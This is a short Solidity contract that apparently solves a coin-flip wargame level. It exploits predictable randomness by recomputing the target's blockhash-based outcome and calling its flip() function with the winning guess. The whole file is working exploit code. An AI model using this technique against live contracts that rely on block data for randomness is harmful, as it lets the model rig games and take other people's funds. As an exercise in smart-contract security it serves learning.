// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';


interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipRunner {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coinFlipAddr;

  constructor() public {
    consecutiveWins = 0;
  }

  function runFlipGuess() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    // Calls the other contract here
    return CoinFlip(coinFlipAddr).flip(side);
  }

  function setCounterAddr(address _coinFlipAddr) public payable {
    coinFlipAddr = _coinFlipAddr;
  }
}